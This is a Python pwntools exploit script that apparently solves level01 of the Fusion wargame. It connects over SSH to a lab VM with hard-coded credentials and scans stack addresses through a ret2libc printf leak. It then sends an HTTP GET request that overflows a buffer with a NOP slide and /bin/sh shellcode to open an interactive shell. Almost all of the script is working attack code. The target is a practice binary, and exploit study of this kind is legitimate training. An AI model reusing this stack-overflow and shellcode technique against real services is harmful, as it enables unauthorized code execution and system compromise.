from pwn import *
from pwnhelper import *



############################################################################################################################################################
# METHOD DEFINITIONS
############################################################################################################################################################

local_dir = None
remote_binary = None
cloned_binary = None

def connect(level):
    global remote_binary
    global local_dir
    global cloned_binary
    global local_dir

    local_dir = "/home/kali/PycharmProjects/fusion/level"+level
    remote_binary = "/opt/fusion/bin/level"+level
    cloned_binary = local_dir+remote_binary
    port = "200"+level
    s = ssh("fusion", "192.168.2.129", password="godmode", cache=False)
    s.download_file(remote_binary, cloned_binary)
    context.clear()
    context.binary = cloned_binary
    context.log_file = "/tmp/docgillog"
    return s, port


def build_payload(overflow):
    off= 12

    # build payload
    get = b"GET "
    path = b"/home/fusion/level00/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    # overwrite saved ebp
    path_overflow = b"B" * off
    path_overflow += overflow
    # this overwrites ret adr and lets us jump to big buffer on nopslide
    proto = b" HTTP/1.1"

    payload = b""
    payload += get
    payload += path
    payload += path_overflow
    payload += proto
    return payload


results_file = None
leak_adr = None
last_log = None


def check_leak(leak, wanted, jump):

    global leak_adr
    global last_log

    # keep track until where is already scanned, so we can start again much further in
    # after possible restart
    if last_log - leak_adr > 1000000:
        print("leaked another million")
        last_log = leak_adr
        with open(results_file, "ab") as file:
            file.write(b"curr adr: " + bytes(hex(leak_adr), encoding="utf-8") + b"\n")

    if leak != b"":

        if b"level01: No protocol version specified" in leak or b"level01: Invalid protocol" in leak:
            # print("invalid adr, ignoring")
            leak_adr -= 1
        else:
            leak_string = bytes(hex(leak_adr), encoding="utf-8") + b" -> " + leak
            print(leak_string)
            with open(results_file, "ab") as file:
                file.write(leak_string + b"\n")
            if wanted in leak:
                print("found wanted adr: " + hex(leak_adr))
                return True
            else:
                # leaked something different
                leak_adr -= (jump+len(leak))
                # print("next checked adr: ")
                # print(hex(leak_adr))
    else:
        # printf did not ret -> tried to print weird string -> segfault
        leak_adr -= jump
    return False


##############################################################################
# FIND ADR HITTING NOP IN BUF BY FILLING BUFFER WITH A'S AND SCAN ADR SPACE
# WITH RET2LIBC PRINTF FUNCTION FOR A'S
##############################################################################

s, port = connect(level="01")

results_file = local_dir+"/results"

s.libs(remote_binary, local_dir)
elf = ELF(cloned_binary)
printf_plt_adr = elf.plt["printf"]
exit_plt_adr = elf.plt["exit"]


print("printf_plt_adr:")
print(hex(printf_plt_adr))


print("exit_plt_adr:")
print(hex(exit_plt_adr))


# start at max adr where stack can be and scan down -> 0xbfffffff
# https://stackoverflow.com/questions/35932518/aslr-entropy-bits-for-stack-on-linux
leak_adr = 0xbfffffff
last_log = 0xbfffffff
amount_nops = None
sh = asm(shellcraft.i386.linux.sh())
nop_replacement = b"A"
buf_nop_adr = None

# print("sh:")
# print(sh)


while True:

    # print("leak_adr:")
    # print(hex(leak_adr))

    path_overflow = b""
    path_overflow += pack(printf_plt_adr, 32)
    path_overflow += pack(exit_plt_adr, 32)
    path_overflow += pack(leak_adr, 32)

    payload = build_payload(path_overflow)
    amount_nops = 1024 - (len(payload) + len(sh))

    # print("amount_nops:")
    # print(amount_nops)

    payload += nop_replacement * amount_nops
    payload += sh

    # print("payload:")
    # print(payload)
    #
    # print("length of payload:")
    # print(len(payload))

    nc = s.process(["nc", "localhost", str(port)])
    nc.sendline(payload)
    leak = nc.recvall()
    context.log_level = "error"
    # -5 on amount nops so i can say that he needs to find at least 4 A's in a row
    # -> i do this to avoid false positives
    leaked = check_leak(leak, nop_replacement*4, amount_nops-5)
    if leaked:
        context.log_level = "info"
        buf_nop_adr = leak_adr
        break


##############################################################################
# HACK LEVEL01 WITH NOW KNOWN NOP SLIDE HITTING BUF ADR
##############################################################################

print("sending real attack now")


payload = build_payload(pack(buf_nop_adr, 32))

# we have 2 adresses less in payload
# lets fill these up with nops

amount_nops += 8

print("amount_nops:")
print(amount_nops)

nop_slide = asm(shellcraft.i386.nop()) * amount_nops
payload += nop_slide
payload += sh

print("sh:")
print(sh)

print("payload:")
print(payload)

print("length of payload:")
print(len(payload))

write("/tmp/docgil", payload)
nc = s.process(["nc", "localhost", str(port)])
nc.sendline(payload)
shell = check_for_shell(nc, always_recvs=True)
if shell:
    nc.interactive()
    exit(0)
else:
    print("no shell")
    exit(1)





